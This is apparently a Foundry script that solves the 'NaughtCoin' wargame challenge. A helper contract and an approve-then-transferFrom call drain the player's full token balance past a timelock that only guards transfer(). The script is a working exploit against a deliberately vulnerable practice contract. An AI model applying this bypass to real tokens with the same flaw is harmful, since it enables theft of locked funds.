// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import {Script, console} from "forge-std/Script.sol";
interface INaughtCoin {
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract NaughtCoinAttack
{
    function drain(address player, address to, address token) external {
        INaughtCoin nc = INaughtCoin(token);
        uint256 bal = nc.balanceOf(player);
        nc.transferFrom(player, to, bal);
    }
}

contract NaughtCoinSolution is Script {
    function run() external
    {
        address instance = 0x69a21c4Ca33118561595429EC091D60B9377db5D;

        vm.startBroadcast();
        INaughtCoin nc = INaughtCoin(instance);
        NaughtCoinAttack attacker = new NaughtCoinAttack();
        console.log("before: ");
        console.log(nc.balanceOf(address(msg.sender)));
        
        nc.approve(address(attacker), nc.balanceOf(address(msg.sender)));
        attacker.drain(address(msg.sender), address(0x1), instance);
        
        console.log("after: ");
        console.log(nc.balanceOf(address(msg.sender)));
        vm.stopBroadcast();
    }
}